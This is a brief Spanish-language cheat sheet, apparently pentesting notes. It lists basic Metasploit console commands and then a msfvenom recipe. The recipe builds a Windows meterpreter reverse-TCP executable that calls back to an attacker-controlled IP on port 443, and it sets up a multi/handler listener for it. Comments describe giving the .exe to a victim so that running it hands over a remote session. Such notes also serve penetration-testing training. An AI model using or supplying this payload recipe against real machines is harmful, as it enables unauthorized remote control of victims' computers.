
### Metasploit basics
```bash
* msfconsole (abrir metasploit)
* search <CVE-****> (buscar exploits)
* search <windows | nombre de la vuln ..>
* use <modulo> (utilizar un exploit)
* show options (para ver lo que podemos aplicar en un exploit)
* set (establecer un parámetro)
* run (lanzar un exploit)
```

### Payloads con MsfVenom

#### Payload sesión meterpreter Windows

```bash
#Generamos el payload y lo compartimos con la víctima
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<ip_atacante> LPORT=443 -f exe -o fichero.exe


# Nos ponemos a la escucha con msfconsole (metasploit)
msfconsole
use multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp

set LPORT=443
set LHOST=<ip_atacante>
run

# Ya solo falta ejecutar el .exe y recibiremos la sesión de meterpreter

```